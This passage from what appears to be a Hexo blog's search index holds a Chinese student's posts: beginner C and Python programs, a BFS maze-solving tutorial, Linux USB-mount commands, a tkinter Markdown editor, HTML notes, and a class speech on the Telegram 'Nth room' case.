&#x27;\\n&#x27;) &#123; continue; &#125; &#125; &#125; return ret_val;&#125;typedef struct LinkList &#123; char name[MAX_INPUT]; long number; LinkList* next;&#125;Link;int main() &#123; char input[MAX_INPUT]; Link* p = (Link*)malloc(sizeof(Link*)); Link* temp = p; printf(&quot;Now start recording: \\n&quot;); printf(&quot;Name : &quot;); while (s_gets(input,MAX_INPUT) != NULL &amp;&amp; input[0] != &#x27;\\0&#x27;) &#123; Link* a = (Link*)malloc(sizeof(Link)); a-&gt;next = NULL; temp-&gt;next = a; temp = temp-&gt;next; strcpy(a-&gt;name, input); printf(&quot;Number: &quot;); scanf(&quot;%ld&quot;, &amp;(a-&gt;number)); getchar(); printf(&quot;Name : &quot;); &#125; temp = p-&gt;next; printf(&quot;Recorded Data: \\n&quot;); while (temp) &#123; printf(&quot;Name: %s\\tNumber: %ld\\n&quot;, temp-&gt;name, temp-&gt;number); temp = temp-&gt;next; &#125; return 0;&#125;","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"知识输出","slug":"知识输出","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA/"}]},{"title":"用Python编写一个能将图片转换为字符画的程序","slug":"用Python编写一个能将图片转换为字符画的程序","date":"2021-04-09T16:46:04.299Z","updated":"2020-11-10T02:54:55.042Z","comments":true,"path":"2021/04/10/用Python编写一个能将图片转换为字符画的程序/","link":"","permalink":"http://uniqueland.top/2021/04/10/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E8%83%BD%E5%B0%86%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AD%97%E7%AC%A6%E7%94%BB%E7%9A%84%E7%A8%8B%E5%BA%8F/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081\\# -*- coding=utf-8 -*- from PIL import Image import argparse #命令行输入参数处理 parser = argparse.ArgumentParser() parser.add_argument(&#x27;file&#x27;) #输入文件parser.add_argument(&#x27;-o&#x27;, &#x27;--output&#x27;) #输出文件 parser.add_argument(&#x27;--width&#x27;, type = int, default = 80) #输出字符画宽 parser.add_argument(&#x27;--height&#x27;, type = int, default = 80) #输出字符画高 #获取参数 args = parser.parse_args() IMG = args.fileWIDTH = args.width HEIGHT = args.height OUTPUT = args.output ascii_char = list(&quot;$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\\|()1&#123;&#125;[]?-_+~&lt;&gt;i!lI;:,\\&quot;^&#x27;. &quot;) # 将256灰度映射到70个字符上 def get_char(r,g,b,alpha = 256): ​ if alpha == 0: ​ return &#x27; &#x27; ​ length = len(ascii_char) ​ gray = int(0.2126 * r + 0.7152 * g + 0.0722 * b) ​ unit = (256.0 + 1)/length ​ return ascii_char[int(gray/unit)] if __name__ == &#x27;__main__&#x27;: ​ im = Image.open(IMG) ​ im = im.resize((WIDTH,HEIGHT), Image.NEAREST) ​ txt = &quot;&quot; ​ for i in range(HEIGHT): ​ for j in range(WIDTH): ​ txt += get_char(*im.getpixel((j,i))) ​ txt += &#x27;\\n&#x27; ​ print(txt) #字符画输出到文件 ​ if OUTPUT: ​ with open(OUTPUT,&#x27;w&#x27;) as f: ​ f.write(txt) ​ else: ​ with open(&quot;output.txt&quot;,&#x27;w&#x27;) as f: ​ f.write(txt)","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"}]},{"title":"人工智能入门-查找","slug":"人工智能入门-搜索","date":"2021-04-09T16:46:04.298Z","updated":"2021-05-02T06:00:22.634Z","comments":true,"path":"2021/04/10/人工智能入门-搜索/","link":"","permalink":"http://uniqueland.top/2021/04/10/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8-%E6%90%9C%E7%B4%A2/","excerpt":"概述 众所周知，人工智能在近些年十分火爆，在各个领域的应用也是十分广泛，其中一个领域就是导航。","text":"概述 众所周知，人工智能在近些年十分火爆，在各个领域的应用也是十分广泛，其中一个领域就是导航。 也许有人会说，导航不就是电子地图嘛？和人工智能有什么关系？但其实在导航中人工智能发挥了很重要的作用。“条条大路通罗马”，为什么导航会向你推荐这条路而不推荐另一条路？这其中就涉及到了人工智能中的搜索算法。 在搜索中，往往有初始状态(initial states)、目标状态(goal states)，而人工智能所做的，就是在众多情形中，找到众多解决方法的最优解，其中会涉及到循环和迭代，假如我们现在有一个初始状态，我们要怎样达到目标状态呢？ 概念介绍 在这之前需要先了解一些概念： 动作：通常是接受状态的函数，返回在此状态中应该做出的决策 迁移模型：通常是接受状态和动作的函数，返回在此状态下做出此种决策后的新状态 节点：数据结构，用来记录状态，父节点，动作和路径成本 边界：数据结构，用来区分已探索的部分和未探索的部分 算法讨论 在了解了相关概念之后，我们开始讨论算法： 首先将初始状态放入边界，然后进入循环 如果边界为空，则无解 从边界中移去一个节点 如果此节点包含目标状态，则追踪父节点，然后返回解决方案 扩张节点并将其加入边界 下面举个例子： 假设我们现在的要求是找到从A到E的路径 第一步我们将A（初始状态）放入边界，进入循环 因为A不是目标状态，将A移出边界并将B加入边界 因为B不是目标状态，将B移出边界并将C和D加入边界 因为C不是目标状态，将C移出边界并将E加入边界 因为E是目标状态，所以我们返回从A到E的路径，循环结束 至此，我们就解决了一个非常简单的路径搜索问题，当然，这个算法还存在着许多问题，比如：如何确保算法不会重新检查当前状态的父节点？如果重复检查父节点，那么程序将进入无限死循环。解决方法很简单，使用一个数据结构来储存已检查过的节点，然后在每次检查节点时遍历此数据结构，如果存在与之相同的节点则不检查。 那么在实际情况下是怎么样的呢？ 实战 下面进入实战环节： 情境：你现在有一张迷宫地图，起点为A，终点为B，需要编写程序令计算机自行找出离开迷宫的路并显示在屏幕上 12345678910111213141516171819# # # # # B # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # A # # # # 我们将这个待实现的程序按照之前所讨论的分为几个部分： 如图所示，我们主要将程序分为三个部分： 首先是定义相关的变量，并且将初始状态放入边界； 然后进入循环： 第一步：检查边界的长度，如果等于0则说明无解 第二步：从边界中移去一个节点，并将此节点添加到表示已探索的数据结构 第三步：检查被移去的节点，如果此节点包含目标状态，则追踪其父节点，并返回路径 最后，我们使用一个循环来追踪完整的路径，并将其显示在屏幕上。 以下是根据思路实现的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495map1 = [[&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;]]# set the routemap1[9][0]=&#x27;A&#x27;map1[0][9]=&#x27;B&#x27;for i in range(10): map1[5][i] = &#x27; &#x27;for i in range(10): map1[i][5] = &#x27; &#x27;map1[9][1] = &#x27; &#x27;map1[9][2] = &#x27; &#x27;map1[9][3] = &#x27; &#x27;map1[9][4] = &#x27; &#x27;map1[0][6] = &#x27; &#x27;map1[0][7] = &#x27; &#x27;map1[0][8] = &#x27; &#x27;# print out the mapfor i in map1: for j in i: print(j,end=&#x27; &#x27;) print(&quot;\\n&quot;)class Unit: def __init__(self,c,p): x=c[0] y=c[1] self.x=x self.y=y self.up=(self.x,self.y+1) self.down=(self.x,self.y-1) self.left=(self.x-1,self.y) self.right=(self.x+1,self.y) self.directions = [self.up,self.down,self.left,self.right] self.parent = pstart=Unit((9,0),(0,0))goal=Unit((0,9),(-1,-1))def travel(map1,start): frontier = [] explored = [] current = Unit((start.x,start.y),start.parent) frontier.append(current) while True: if len(frontier) == 0: print(&quot;No result&quot;) break del(frontier[0]) explored.append(Unit((current.x,current.y),current.parent)) if current.x == goal.x and current.y == goal.y: print(&quot;\\nGot it!\\n&quot;) while current.parent != (0,0): for trace in explored: if trace.x == current.parent[0] and trace.y == current.parent[1]: if map1[current.x][current.y] == &#x27; &#x27;: map1[current.x][current.y] = &#x27;.&#x27; # print(current.x,current.y) current = trace for i in map1: for j in i: print(j,end=&#x27; &#x27;) print(&quot;\\n&quot;) break for i in current.directions: j=Unit((i[0],i[1]),(current.x,current.y)) # print((j.x,j.y),end=&#x27;,&#x27;) condition = 1 for x in explored: if x.x==j.x and x.y==j.y: condition = 0 if condition and j.x&gt;=0 and j.x&lt;=9 and j.y&gt;=0 and j.y&lt;=9 and map1[j.x][j.y] != &#x27;#&#x27;: frontier.append(Unit((i[0],i[1]),(current.x,current.y))) current = frontier[0] travel(map1,start) 在实现的过程中，我遇到了一些问题： 由于对Python中类的使用不熟练，导致代码中有关部分看起来很奇怪 在遍历当前节点周围的有效节点时，没有重新初始化节点，而是直接将当前节点周围有效节点的坐标加入边界，导致循环从第二次开始就无法进行，因为坐标没有“周围的有效节点”这个属性 在将以探索过的节点加入对应数据结构后，检查下一个节点是否在此数据结构时直接使用“==”，但是即使坐标相同的两个节点也可能不相等，原因是这两个节点存在于不同的地址，正确的做法是再遍历一遍存储以探索过的数据结构，直接比较此数据结构中节点的坐标值 在完成初步的实现后，处于对代码重构的要求，对代码做了相关的函数封装： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107map1 = [[&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;]]# set the routemap1[9][0]=&#x27;A&#x27;map1[0][9]=&#x27;B&#x27;for i in range(10): map1[5][i] = &#x27; &#x27;for i in range(10): map1[i][5] = &#x27; &#x27;map1[9][1] = &#x27; &#x27;map1[9][2] = &#x27; &#x27;map1[9][3] = &#x27; &#x27;map1[9][4] = &#x27; &#x27;map1[0][6] = &#x27; &#x27;map1[0][7] = &#x27; &#x27;map1[0][8] = &#x27; &#x27;# print out the mapdef map_show(map1): for i in map1: for j in i: print(j,end=&#x27; &#x27;) print(&quot;\\n&quot;)map_show(map1)class Unit: def __init__(self,c,p): x=c[0] y=c[1] self.x=x self.y=y self.up=(self.x,self.y+1) self.down=(self.x,self.y-1) self.left=(self.x-1,self.y) self.right=(self.x+1,self.y) self.directions = [self.up,self.down,self.left,self.right] self.parent = pstart=Unit((9,0),(0,0))goal=Unit((0,9),(-1,-1))def route_trace(current,explored): while current.parent != (0,0): for trace in explored: if trace.x == current.parent[0] and trace.y == current.parent[1]: if map1[current.x][current.y] == &#x27; &#x27;: map1[current.x][current.y] = &#x27;.&#x27; # print(current.x,current.y) current = tracedef action(frontier,explored,current): for i in current.directions: j=Unit((i[0],i[1]),(current.x,current.y)) # print((j.x,j.y),end=&#x27;,&#x27;) condition = 1 for x in explored: if x.x==j.x and x.y==j.y: condition = 0 if condition and j.x&gt;=0 and j.x&lt;=9 and j.y&gt;=0 and j.y&lt;=9 and map1[j.x][j.y] != &#x27;#&#x27;: frontier.append(Unit((i[0],i[1]),(current.x,current.y)))def travel(map1,start): frontier = [] explored = [] current = Unit((start.x,start.y),start.parent) frontier.append(current) while True: if len(frontier) == 0: print(&quot;No result&quot;) break del(frontier[0]) explored.append(Unit((current.x,current.y),current.parent)) if current.x == goal.x and current.y == goal.y: print(&quot;\\nGot it!\\n&quot;) route_trace(current,explored) map_show(map1) break action(frontier,explored,current) if len(frontier) == 0: print(&quot;No result&quot;) break current = frontier[0] travel(map1,start) 结果如下： 123456789101112131415161718192021222324252627282930313233343536373839404142# # # # # B # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # A # # # # Got it!# # # # # . . . . B # # # # # . # # # # # # # # # . # # # # # # # # # . # # # # # # # # # . # # # # . # # # # # . # # # # # # # # # . # # # # # # # # # . # # # # A . . . . . # # # # 现在，这个程序已经能够找出各种迷宫地图的解法了，也就是说，如果我们对地图进行修改，程序也能够正常运行并输出相应结果，比如，我们将地图的唯一道路“封死”，那么结果就会是“No result”，如下所示： 123456789101112131415161718192021# # # # # B # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # A # # # # # No result 至此，我们就完成了对此情境下相关代码的编写。 修改于2021.04.11","categories":[],"tags":[{"name":"知识输出","slug":"知识输出","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA/"},{"name":"AI","slug":"AI","permalink":"http://uniqueland.top/tags/AI/"}]},{"title":"来自班级组织演讲的一篇演讲稿","slug":"Speech","date":"2021-04-09T16:46:04.297Z","updated":"2020-11-09T06:00:08.000Z","comments":true,"path":"2021/04/10/Speech/","link":"","permalink":"http://uniqueland.top/2021/04/10/Speech/","excerpt":"正文地狱空荡荡 恶魔在人间 想必在座各位多少看过这句话，这就是我今天要说的有关Telegram N号房事件的一些东西；由于案情复杂，我就不再赘述，有兴趣的请自行百度主要人物介绍：","text":"正文地狱空荡荡 恶魔在人间 想必在座各位多少看过这句话，这就是我今天要说的有关Telegram N号房事件的一些东西；由于案情复杂，我就不再赘述，有兴趣的请自行百度主要人物介绍：赵主彬：现年25岁，信息通信专业，曾担任学报编辑部编辑。多次获得奖学金。3年内参加了50多次志愿活动。就是这么一个表面人畜无害的优秀学生，主导了这么一起事件。对此人进行分析，我们不难得出：平台用telegram，交易用比特币，说明罪犯反侦查意识高，思维敏捷，可以归类为高智商信息犯罪；内心自卑，但是外围性格特征表现为自负，因无法达到自身的高度预期郁不得志，因此可能存在社会偏见，有一定概率发展为反社会型人格；可能存在家庭暴力，且是父权家庭；社交能力较差，排斥甚至仇视女性，这点可以从他在被捕后的言论发表矢口不谈对女性的道歉这一点可以看出。 有的孩子是孩子，有的孩子是禽兽这十几年都塞了什么进脑子里人名不打码，马赛克做错了什么 就像这些评论所表述的一样，我也痛恨这些精虫上脑的东西。但是几乎一边倒的网络舆论显然有些问题：这26万人个个都罪该万死吗？考虑到涉案人数及案件的复杂程度，我个人觉得其中还是不乏被教唆的，受蒙骗的，甚至不明情况的。不是说强行洗白，而是我认为每个人看待事情都应该有自己的看法，有那种不被舆论大势所动摇的那种看法。大家是否看过这样一个比喻：韩国目前在运营的出租车大概有26万辆，这意味着在韩国的大街上，遇到N号房会员就像遇到出租车一样频繁。不知各位对这个比喻有什么看法在我看来，这是一种下意识的情景描绘，旨在放大案件涉及的范围，而这种情景描绘于我来看除了放大恐慌之外没有任何用处，那他们这么做的目的何在呢？要我说要不就是公众号博人眼球，要不就涉及到黑公关带节奏，由于这是一个国家级的案件，比起背后大到令人无法想象的黑灰产业链，我还是更倾向于前者。 最后，引用了几句某些公众号的评价作为我对此事的看法，话很粗，但理不粗：作为一个成年人，要学会克制，不该馋的不要馋。我知道现在是春天，但只有野狗才不分场合、不分对象，时刻想着交配。何况，野狗也只在春秋两季才发情 补充由于班级组织的演讲限时3分钟，所以我不得不把原本一千多字的演讲稿删为800多字，也因此缺失了很多事件的细节及个人的观点。–2020.05.07","categories":[],"tags":[]},{"title":"Linux下利用命令行对U盘和电脑中的文件进行操作","slug":"Operations between flash disk and linux os","date":"2021-04-09T16:46:04.296Z","updated":"2020-11-10T03:52:41.832Z","comments":true,"path":"2021/04/10/Operations between flash disk and linux os/","link":"","permalink":"http://uniqueland.top/2021/04/10/Operations%20between%20flash%20disk%20and%20linux%20os/","excerpt":"","text":"123456fdisk -l #查看接入设备名称mount /dev/sda1 /mnt #挂载U盘ls /mnt #查看U盘文件cp file directory #复制指定文件file至指定目录directoryls /mnt #再次查看U盘文件umount /mnt #卸载U盘 标题（可选）提示：若操作中出现错误，请查看权限是否正确，或在每次操作前加’sudo’cp后的文件和路径需带路径(个人推荐绝对路径)","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"}]},{"title":"Markdown_Editor V1.0","slug":"Markdown_Editor V1.0","date":"2021-04-09T16:46:04.295Z","updated":"2020-11-10T02:56:29.631Z","comments":true,"path":"2021/04/10/Markdown_Editor V1.0/","link":"","permalink":"http://uniqueland.top/2021/04/10/Markdown_Editor%20V1.0/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556\\# -*- coding=utf-8 -*- import tkinterimport osfrom tkinter import filedialogwin_size=&#x27;450x550&#x27;win = tkinter.Tk()win.geometry(win_size)win.title(&#x27;Markdown Editor V1.0 (hexo only)&#x27;)def processandsave(): contents = &#x27;---\\ntitle:&#x27; + title.get(&#x27;0.0&#x27;,&#x27;end&#x27;) + &#x27;tags:&#x27; + tags.get(&#x27;0.0&#x27;,&#x27;end&#x27;) + &#x27;---\\n&#x27; + content.get(&#x27;0.0&#x27;,&#x27;end&#x27;) filename = filedialog.asksaveasfilename() if filename is not None: with open(file=filename,mode=&#x27;w&#x27;) as file: file.write(str(contents)) title.delete(&#x27;0.0&#x27;,&#x27;end&#x27;) tags.delete(&#x27;0.0&#x27;,&#x27;end&#x27;) content.delete(&#x27;0.0&#x27;,&#x27;end&#x27;)def add_bash(): add_content=add_bash_text.get(&#x27;0.0&#x27;,&#x27;end&#x27;) add_content=add_content.rstrip() changing_content=&#x27;```bash\\n&#x27;+add_content+&#x27;\\n```\\n&#x27; content.insert(&#x27;end&#x27;,changing_content) add_bash_text.delete(&#x27;0.0&#x27;,&#x27;end&#x27;)label1=tkinter.Label(text=&#x27;标题&#x27;,padx=10,pady=10)label1.grid(row=0,column=0)title=tkinter.Text(width=40,height=2)title.grid(row=0,column=1,columnspan=2)label2=tkinter.Label(text=&#x27;标签&#x27;,padx=5,pady=5)label2.grid(row=1,column=0)tags=tkinter.Text(width=30,height=1)tags.grid(row=1,column=1)label3=tkinter.Label(text=&#x27;正文&#x27;,padx=5,pady=5)label3.grid(row=2,column=0)content=tkinter.Text(width=40,height=20)content.grid(row=2,column=1,rowspan=5)add_bash_button=tkinter.Button(win,text=&#x27;命令行&#x27;,command=add_bash)add_bash_button.grid(row=9,column=0)add_bash_text=tkinter.Text(width=40,height=5)add_bash_text.grid(row=9,column=1)save_button=tkinter.Button(win,text=&#x27;保存&#x27;,command=processandsave)save_button.grid(row=8,column=1)win.mainloop()","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"}]},{"title":"Thanksgiving","slug":"img_share","date":"2021-04-09T16:46:04.294Z","updated":"2020-11-28T16:15:08.320Z","comments":true,"path":"2021/04/10/img_share/","link":"","permalink":"http://uniqueland.top/2021/04/10/img_share/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"HTML笔记","slug":"HTML_notes","date":"2021-04-09T16:46:04.293Z","updated":"2021-01-18T15:02:48.534Z","comments":true,"path":"2021/04/10/HTML_notes/","link":"","permalink":"http://uniqueland.top/2021/04/10/HTML_notes/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980811 &lt;h1&gt; to &lt;/h6&gt;: 一到六号标题2 &lt;p&gt;段落&lt;/p&gt;3 &lt;body style=&quot;background-color:PowderBlue;&quot;&gt; &lt;p style=&quot;font-family:verdana;color:red&quot;&gt;对段落样式进行修改&lt;/p&gt; &lt;/body&gt;4 &lt;br /&gt;&lt;hr /&gt;&lt;!这是注释，前面的是换行和分割线&gt;5 &lt;b&gt;被加粗的内容&lt;/b&gt;6 &lt;strong&gt;被...加粗的内容...吧&lt;/strong&gt;7 &lt;big&gt;被加大的内容&lt;/big&gt;8 &lt;em&gt;被强调(加斜)的内容&lt;/em&gt;9 &lt;i&gt;被...意大利式加斜的内容&lt;/i&gt;10 &lt;small&gt;被减小的内容&lt;/small&gt;11 &lt;sub&gt;位于右下角的小字部分&lt;/sub&gt;12 &lt;sup&gt;位于右上角的小字部分&lt;/sup&gt;13 &lt;pre&gt;预格式文本(保留了空格和换行)&lt;/pre&gt;14 &lt;code&gt;用于&lt;/code&gt;,&lt;kbd&gt;显示&lt;/kbd&gt;,&lt;samp&gt;代码&lt;/samp&gt;,&lt;var&gt;这个加大加粗了一点&lt;/var&gt;15 &lt;address&gt;用于书写地址，其中记得手动添加换行标签&lt;/address&gt;16 &lt;abbr title=&quot;etcetera&quot;&gt;etc.&lt;/abbr&gt;17 &lt;acronym title=&quot;World Wide Web&quot;&gt;WWW&lt;/acronym&gt;18 &lt;bdo dir=&quot;rtl&quot;&gt;印打序倒&lt;/bdo&gt;19 &lt;blockquote&gt;块引用&lt;/blockquote&gt;,&lt;q&gt;短引用&lt;/q&gt;20 &lt;p&gt;你看&lt;del&gt;我被划掉了&lt;/del&gt;&lt;ins&gt;又被加下划线了&lt;/ins&gt;&lt;/p&gt;21 &lt;a name=&quot;tips&quot;&gt;基本的注意事项 - 有用的提示&lt;/a&gt; &lt;a href=&quot;#tips&quot;&gt;有用的提示&lt;/a&gt;22 &lt;img src=&quot;url&quot; width=xx height=xx align=xxx /&gt;23 &lt;table border=&quot;1&quot;&gt; &lt;tr&gt; &lt;th&gt;Heading&lt;/th&gt; &lt;th&gt;Another Heading&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;row 1, cell 1&lt;/td&gt; &lt;td&gt;row 1, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;row 2, cell 1&lt;/td&gt; &lt;td&gt;row 2, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;24 &lt;ul&gt;&lt;!unsorted list&gt; &lt;li&gt;Coffee&lt;/li&gt; &lt;li&gt;Milk&lt;/li&gt; &lt;/ul&gt;25 &lt;ol&gt;&lt;!ordered list&gt; &lt;li&gt;Coffee&lt;/li&gt; &lt;li&gt;Milk&lt;/li&gt; &lt;/ol&gt;26 &lt;dl&gt;&lt;!defined list&gt; &lt;dt&gt;Coffee&lt;/dt&gt; &lt;dd&gt;Black hot drink&lt;/dd&gt; &lt;dt&gt;Milk&lt;/dt&gt; &lt;dd&gt;White cold drink&lt;/dd&gt; &lt;/dl&gt;27 &lt;head&gt; &lt;style&gt; .cities &#123; background-color:black; color:white; margin:20px; padding:20px; &#125; &lt;/style&gt; &lt;/head&gt;28 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;style&gt; span.red &#123;color:red;&#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;My &lt;span class=&quot;red&quot;&gt;Important&lt;/span&gt; Heading&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt;29 &lt;iframe src=&quot;demo_iframe.htm&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;/iframe&gt;30 &lt;body background=&quot;http://www.w3school.com.cn/clouds.gif&quot;&gt;31 &lt;script type=&quot;text/javascript&quot;&gt; document.write(&quot;Hello World!&quot;) &lt;/script&gt; &lt;noscript&gt;Your browser does not support JavaScript!&lt;/noscript&gt; Quick Search","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"}]},{"title":"0","slug":"0","date":"2020-03-22T09:06:28.000Z","updated":"2020-11-09T06:00:08.000Z","comments":true,"path":"2020/03/22/0/","link":"","permalink":"http://uniqueland.top/2020/03/22/0/","excerpt":"","text":"Hello,World！说人话 我终于有自己的网站啦 虽然只是部署在github上的先做个测试 下回在看看要弄啥peach..啊不…peace～～","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"},{"name":"linux","slug":"linux","permalink":"http://uniqueland.top/tags/linux/"},{"name":"other","slug":"other","permalink":"http://uniqueland.top/tags/other/"},{"name":"ctf、web","slug":"ctf、web","permalink":"http://uniqueland.top/tags/ctf%E3%80%81web/"},{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"},{"name":"CTF","slug":"CTF","permalink":"http://uniqueland.top/tags/CTF/"},{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"},{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"知识输出","slug":"知识输出","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA/"},{"name":"AI","slug":"AI","permalink":"http://uniqueland.top/tags/AI/"}]}